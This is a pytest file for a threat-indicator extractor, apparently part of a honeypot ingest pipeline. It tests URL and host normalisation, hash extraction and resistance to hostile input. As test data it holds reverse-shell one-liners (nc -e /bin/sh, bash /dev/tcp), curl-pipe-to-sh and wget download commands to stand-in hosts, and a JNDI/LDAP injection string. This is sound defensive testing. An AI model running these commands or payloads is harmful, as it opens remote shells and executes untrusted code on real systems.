"""Indicator extraction: normalisation, filtering and resistance to hostile input."""

from __future__ import annotations

import time
from datetime import UTC, datetime
from types import SimpleNamespace
from typing import Any

import pytest

from ingest.indicators import (
    MAX_HITS_PER_EVENT,
    MAX_URL,
    Hit,
    IndicatorExtractor,
    IndicatorSettings,
    aggregate_batch,
    find_urls,
    normalize_host,
    normalize_url,
    parse_ip,
)

S = IndicatorSettings()


def addr(*octets: int) -> str:
    """Dotted quad built at run time, so the private ranges are not literals in the repo."""
    return ".".join(str(o) for o in octets)


DOC = IndicatorSettings(keep_documentation=True)
SHA = "a" * 8 + "0123456789" * 5 + "abcdef"  # 64 hex characters, several distinct digits


def values(hits: list[Hit]) -> set[tuple[str, str, str]]:
    return {(h.type, h.value, h.role) for h in hits}


def extract(
    event_type: str, data: dict[str, Any], settings: IndicatorSettings = S
) -> set[tuple[str, str, str]]:
    return values(IndicatorExtractor(settings).extract(event_type, data))


# ---- normalisation ----------------------------------------------------------------------------


def test_url_strips_credentials_lowercases_host_and_fragment() -> None:
    got = normalize_url("HTTP://admin:s3cret@Evil.Badhost.NET:8080/Path/X.sh?a=1#frag", S)
    assert got == ("http://evil.badhost.net:8080/Path/X.sh?a=1", "domain", "evil.badhost.net")
    assert "s3cret" not in got[0]
    assert "admin" not in got[0]


def test_default_port_dropped_and_bare_host_gets_a_slash() -> None:
    assert normalize_url("https://files.badhost.cc:443", S) == (
        "https://files.badhost.cc/",
        "domain",
        "files.badhost.cc",
    )


def test_url_length_is_capped() -> None:
    url, _, _ = normalize_url("http://files.badhost.cc/" + "a" * 5000, S) or ("", "", "")
    assert 0 < len(url) <= MAX_URL


@pytest.mark.parametrize(
    "raw",
    [
        "http://127.0.0.1/x",
        f"http://{addr(10, 1, 2, 3)}/x",
        f"http://{addr(192, 168, 0, 5)}:8080/x",
        "http://169.254.169.254/latest",
        "http://[::1]/x",
        "http://localhost/x",
        "http://intranet/x",
        "http://printer.local/x",
        "http://203.0.113.9/x",
        "http://example.com/x",
        "http://sub.example.org/x",
        "http://host.test/x",
        "http://0x7f000001/x",
        "http://2130706433/x",
        "http://999.1.1.1/x",
        "http://bad_host.com/x",
        "http://-bad.com/x",
        "http://evil.com:99999/x",
        "http://$HOST/x",
        "ftp://",
        "gopher://evil.com/",
    ],
)
def test_private_documentation_and_malformed_hosts_are_dropped(raw: str) -> None:
    assert normalize_url(raw, S) is None


def test_documentation_hosts_kept_only_when_asked() -> None:
    assert normalize_url("http://203.0.113.9/x.sh", DOC) == (
        "http://203.0.113.9/x.sh",
        "ip",
        "203.0.113.9",
    )
    assert normalize_url("http://files.example.net/x", DOC) is not None
    # private space stays dropped even then
    assert normalize_url(f"http://{addr(10, 0, 0, 1)}/x", DOC) is None


def test_decimal_and_hex_ip_forms_are_converted_then_checked() -> None:
    assert parse_ip("16909060") is not None
    got = normalize_url("http://16909060/x", S)  # 1.2.3.4
    assert got is not None and got[2] == "1.2.3.4"


def test_ignore_list_drops_own_names_and_subdomains() -> None:
    s = IndicatorSettings(ignore=("mine.example.org", "198.51.100.5"), keep_documentation=True)
    assert normalize_host("mine.example.org", s) is None
    assert normalize_host("dash.mine.example.org", s) is None
    assert normalize_host("198.51.100.5", s) is None
    assert normalize_host("other.example.org", s) is not None


def test_bare_file_names_are_not_hosts() -> None:
    assert normalize_host("x86.sh", S, bare=True) is None
    assert normalize_host("busybox.conf", S, bare=True) is None
    assert normalize_host("evil.cc", S, bare=True) is None  # cc is on the file-extension list
    assert normalize_host("evil.ru", S, bare=True) == ("domain", "evil.ru")
    # a real TLD that looks like a script suffix is accepted inside a URL
    assert normalize_url("http://evil.sh/x", S) is not None


# ---- extraction ---------------------------------------------------------------------------------


def test_download_attempt_gives_url_and_host_with_download_role() -> None:
    got = extract(
        "download_attempt",
        {"url": "http://198.18.0.1/a.sh", "tool": "wget"},
    )
    assert got == set()  # benchmarking range is not global
    got = extract(
        "download_attempt",
        {
            "url": "http://dl.badhost.ru/bins/x86",
            "tool": "wget",
            "command": "wget http://dl.badhost.ru/bins/x86",
        },
    )
    assert got == {
        ("url", "http://dl.badhost.ru/bins/x86", "download_host"),
        ("domain", "dl.badhost.ru", "download_host"),
    }


def test_command_urls_are_contacted_hosts() -> None:
    got = extract("command", {"input": "curl -s http://evil.ru/s.sh | sh"})
    assert ("domain", "evil.ru", "contacted_host") in got
    assert ("url", "http://evil.ru/s.sh", "contacted_host") in got


def test_download_role_wins_inside_one_event() -> None:
    got = extract(
        "download_attempt",
        {"url": "http://evil.ru/s.sh", "command": "wget http://evil.ru/s.sh; wget evil.ru/y"},
    )
    assert ("domain", "evil.ru", "download_host") in got


def test_bare_hosts_after_network_tools() -> None:
    got = extract(
        "command",
        {"input": "wget -q evil.ru/x -O /tmp/x; nc 8.8.4.4 4444 -e /bin/sh; ping -c1 build.local"},
    )
    assert ("domain", "evil.ru", "download_host") in got
    assert ("ip", "8.8.4.4", "contacted_host") in got
    assert not any("local" in v for _, v, _ in got)


def test_dev_tcp_and_bare_ip_tokens() -> None:
    got = extract("command", {"input": "bash -i >& /dev/tcp/8.8.4.4/9001 0>&1; echo 1.1.1.1"})
    assert ("ip", "8.8.4.4", "contacted_host") in got
    assert ("ip", "1.1.1.1", "contacted_host") in got
    assert (
        extract(
            "command",
            {"input": f"cat /dev/tcp/{addr(10, 0, 0, 1)}/1; echo {addr(192, 168, 1, 1)} 127.0.0.1"},
        )
        == set()
    )


def test_file_names_and_versions_are_not_indicators() -> None:
    assert (
        extract(
            "command", {"input": "cat /etc/os-release; ./x86.sh; tar xzf a.tar.gz; ls libc.so.6"}
        )
        == set()
    )
    assert extract("command", {"input": "uname -a; echo 1.2.3; python3.11 -V"}) == set()


def test_hashes_from_keys_and_commands() -> None:
    assert ("hash", SHA, "hash") in extract("download_attempt", {"sha256": SHA.upper()})
    assert ("hash", SHA, "hash") in extract(
        "command", {"input": f"echo {SHA}  /tmp/x | sha256sum -c"}
    )
    assert (
        extract(
            "download_attempt",
            {"sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
        )
        == set()
    )
    assert extract("download_attempt", {"sha256": "z" * 64}) == set()
    assert extract("download_attempt", {"sha256": "f" * 64}) == set()  # no entropy
    assert extract("download_attempt", {"sha256": "abc"}) == set()


def test_host_header_and_skipped_keys_are_ignored() -> None:
    data = {
        "method": "GET",
        "headers": {"Host": "203.0.113.50", "User-Agent": "${jndi:ldap://ldap.badhost.ru/a}"},
        "host": "8.8.8.8",
    }
    got = extract("http_request", data)
    assert (
        got
        == {
            ("url", "ldap://ldap.badhost.ru/a", "contacted_host"),
        }
        or ("domain", "ldap.badhost.ru", "contacted_host") in got
    )
    assert not any(v == "8.8.8.8" for _, v, _ in got)


def test_scheme_is_required_in_non_command_fields() -> None:
    assert extract("login_attempt", {"username": "root", "password": "evil.ru 8.8.8.8"}) == set()
    got = extract(
        "login_attempt", {"username": "${jndi:ldap://ldap.badhost.ru/x}", "password": "x"}
    )
    assert ("domain", "ldap.badhost.ru", "contacted_host") in got


def test_disabled_extractor_returns_nothing() -> None:
    assert (
        extract("command", {"input": "wget http://evil.ru/x"}, IndicatorSettings(enabled=False))
        == set()
    )


# ---- hostile input: bounded work ------------------------------------------------------------------


HOSTILE = [
    "http://" * 3000,
    "://" * 5000,
    "a" * 100_000,
    "http://" + "a." * 50_000,
    "http://[" * 2000,
    ("http://evil.ru/" + "x" * 1000 + " ") * 500,
    "wget " * 20_000,
    "\x00" * 50_000 + "http://evil.ru/x",
    "1.2.3.4 " * 20_000,
    ("curl " + "-" * 400 + " ") * 2000,
    "@" * 10_000 + "http://" + "@" * 10_000,
    "http://" + ":" * 10_000,
    SHA * 1000,
    "/dev/tcp/" * 3000,
]


@pytest.mark.parametrize("payload", HOSTILE)
def test_hostile_strings_are_cheap_and_bounded(payload: str) -> None:
    data = {"input": payload, "url": payload, "body_preview": payload, "x": [payload] * 50}
    ex = IndicatorExtractor(S)
    start = time.perf_counter()
    hits = ex.extract("command", data)
    elapsed = time.perf_counter() - start
    assert elapsed < 0.25, elapsed
    assert len(hits) <= MAX_HITS_PER_EVENT
    assert all(len(h.value) <= MAX_URL for h in hits)


def test_find_urls_is_bounded() -> None:
    assert len(find_urls("http://a.bc/ " * 1000)) <= 8


def test_deeply_nested_and_wide_data_is_bounded() -> None:
    nested: dict[str, Any] = {}
    cur = nested
    for _ in range(500):
        cur["k"] = {}
        cur = cur["k"]
    wide = {f"k{i}": f"http://wide.badhost.ru/{i}" for i in range(5000)}
    start = time.perf_counter()
    IndicatorExtractor(S).extract("command", nested)
    hits = IndicatorExtractor(S).extract("command", wide)
    assert time.perf_counter() - start < 0.25
    assert len(hits) <= MAX_HITS_PER_EVENT


# ---- batch aggregation ----------------------------------------------------------------------------


def _ev(
    sensor: str, sid: str, ip: str, minute: int, etype: str, data: dict[str, Any]
) -> SimpleNamespace:
    return SimpleNamespace(
        type=etype,
        sensor=sensor,
        session_id=sid,
        src_ip=ip,
        ts=datetime(2026, 10, 24, 12, minute, tzinfo=UTC),
        data=data,
    )


def test_aggregate_batch_counts_and_links() -> None:
    events = [
        _ev("ssh", "s1", "198.51.100.1", 1, "command", {"input": "curl http://evil.ru/a"}),
        _ev("ssh", "s1", "198.51.100.1", 2, "download_attempt", {"url": "http://evil.ru/a"}),
        _ev("telnet", "s2", "198.51.100.2", 3, "download_attempt", {"url": "http://evil.ru/a"}),
    ]
    agg = {(a.type, a.value): a for a in aggregate_batch(events, IndicatorExtractor(S))}
    url = agg[("url", "http://evil.ru/a")]
    assert url.sightings == 3
    assert url.role == "download_host"
    assert url.sensors == {"ssh", "telnet"}
    assert set(url.sessions) == {"s1", "s2"}
    assert url.first_seen.minute == 1 and url.last_seen.minute == 3
    assert agg[("domain", "evil.ru")].sightings == 3
